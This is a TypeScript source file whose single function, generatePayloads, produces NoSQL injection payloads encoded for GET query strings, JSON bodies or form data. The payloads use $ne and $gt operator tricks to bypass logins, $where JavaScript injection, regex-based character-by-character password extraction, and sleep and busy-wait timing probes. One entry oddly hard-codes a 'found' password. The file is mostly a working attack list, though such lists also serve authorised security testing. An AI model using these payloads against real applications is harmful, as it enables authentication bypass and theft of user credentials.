export function generatePayloads(fieldName: string, isJson: boolean, isGet: boolean) {
    const payloads = [
      { [fieldName]: { "$ne": null }, description: "Equality check for null" },
      { [fieldName]: { "$gt": "" }, description: "Greater than empty string" },
      { "$or": [{ [fieldName]: "admin" }, { [fieldName]: { "$ne": "a" } }], description: "Logical OR for fieldName" },
      { [fieldName]: { "$regex": ".*" }, description: "Regex match for fieldName" },
      { [fieldName]: { "$in": ["admin", "user"] }, [fieldName]: { "$ne": "password" }, description: "In list for fieldName and not equal for another value" },

      // GET method query payloads
      { search: `admin' && this.password%00`, description: "Check if the field password exists" },
      { search: `admin' && this.password && this.password.match(/.*/)%00`, description: "Start matching password" },
      { [fieldName]: `admin' && this.password && this.password.match(/^a.*$/)%00`, description: "Match password starting with 'a'" },
      { [fieldName]: `admin' && this.password && this.password.match(/^b.*$/)%00`, description: "Match password starting with 'b'" },
      { [fieldName]: `admin' && this.password && this.password.match(/^c.*$/)%00`, description: "Match password starting with 'c'" },
      { [fieldName]: `admin' && this.password && this.password.match(/^duvj.*$/)%00`, description: "Match password starting with 'duvj'" },
      { [fieldName]: `admin' && this.password && this.password.match(/^duvj78i3u$/)%00`, description: "Found exact password 'duvj78i3u'" },

      // POST method body payloads
      { [fieldName]: { "$func": "var_dump" }, description: "PHP function payload" },

      // Common NoSQL injection payloads
      { true: 1, $where: '1 == 1', description: "NoSQL injection with $where" },
      { $where: '1 == 1', description: "NoSQL injection with $where" },
      { [fieldName]: "1, $where: '1 == 1'", description: "NoSQL injection with $where" },
      { [fieldName]: "{ $ne: 1 }", description: "NoSQL injection with $ne" },
      { [fieldName]: "' && this.password.match(/.*/)//+%00", description: "Regex match for password" },
      { [fieldName]: "'%20%26%26%20this.password.match(/.*/)//+%00", description: "URL encoded regex match for password" },
      { [fieldName]: "';sleep(5000);", description: "Sleep for 5 seconds" },
      { [fieldName]:"';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);", description: "Busy wait for 5 seconds" },
      { [fieldName]: '{"username": {"$ne": null}, "password": {"$ne": null}}', description: "Both username and password not null" },
      { [fieldName]: '{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}', description: "Username not 'foo' and password not 'bar'" },
      { [fieldName]: '{"username": {"$gt": undefined}, "password": {"$gt": undefined}}', description: "Username and password greater than undefined" },
      { [fieldName]: '{"username": {"$gt":""}, "password": {"$gt":""}}', description: "Username and password greater than empty string" },
      { [fieldName]: '{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}', description: "Username in list and password greater than empty string" }
    ];
  
    if (isGet) {
      return payloads.map(payload => ({
        payload: new URLSearchParams(payload as any).toString(),
        description: payload.description
      }));
    }
  
    if (isJson) {
      return payloads.map(payload => ({
        payload: JSON.stringify(payload),
        description: payload.description
      }));
    }

    return payloads.map(payload => ({
      payload: new URLSearchParams(payload as any).toString(),
      description: payload.description
    })) 
}
